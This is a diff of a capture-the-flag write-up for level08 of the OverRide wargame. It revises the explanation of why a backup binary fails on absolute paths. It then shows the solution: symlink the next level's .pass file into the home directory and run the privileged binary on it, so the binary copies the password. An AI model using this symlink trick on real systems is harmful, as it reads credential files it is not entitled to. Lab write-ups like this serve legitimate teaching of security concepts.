@@ -47,7 +47,7 @@ level08@OverRide:~$ ./level08 /home/users/level09/.pass
 ERROR: Failed to open ./backups//home/users/level09/.pass
 ```
 
-No, because it doesn't deal with files inside directories. So, in the home directory, lets create a symlink to the password. Now we can run the binary on the symlink, and it creates a backup of the password.
+No, because it doesn't deal with files inside directories (concaternates filepath ```//```), it only works with files in the current directory. So, in the home directory, lets create a symlink to ```/home/users/level09/.pass```. Now we can run the binary on the symlink, and it creates a backup of the password file in the ```backups/``` folder.
 ```
 level08@OverRide:~$ ln -s /home/users/level09/.pass password
 level08@OverRide:~$ ./level08 password
